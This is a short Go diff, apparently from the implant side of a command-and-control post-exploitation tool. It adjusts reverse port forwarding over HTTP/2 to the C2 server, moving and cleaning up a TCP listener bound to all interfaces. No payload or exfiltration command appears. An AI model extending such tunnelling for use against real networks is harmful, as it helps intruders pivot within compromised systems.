@@ -134,13 +134,14 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
-	if !tun.ValidateIPPort(addr) {
+	if !tun.ValidateIPPort(addr) && !reverse {
 		return fmt.Errorf("Invalid address: %s", addr)
 	}
 
 	// connect via h2 to CC, or not
 	ctx, cancel = context.WithCancel(context.Background())
 	if reverse {
+		log.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
 		conn, ctx, cancel, err = ConnectCC(url)
@@ -179,14 +180,6 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		err error
 	)
 
-	// listen
-	addr := "0.0.0.0:" + port
-	l, err := net.Listen("tcp", addr)
-	if err != nil {
-		log.Printf("listen on %s failed: %s", addr, err)
-	}
-	defer cancel()
-
 	// serve a TCP connection received on agent side
 	serveConn := func(conn net.Conn) {
 		// start a h2 connection per incoming TCP connection
@@ -198,7 +191,6 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		defer func() {
 			defer h2cancel()
 			_, _ = h2.Write([]byte("exit\n"))
-			l.Close()
 		}()
 
 		// tell CC this is a subsession (same mapping but different h2 req)
@@ -226,6 +218,20 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			}
 		}()
 	}
+
+	// listen
+	addr := "0.0.0.0:" + port
+	l, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Printf("listen on %s failed: %s", addr, err)
+		cancel()
+	}
+	defer func() {
+		if l != nil {
+			l.Close()
+		}
+		cancel()
+	}()
 
 	// serve
 	for ctx.Err() == nil {
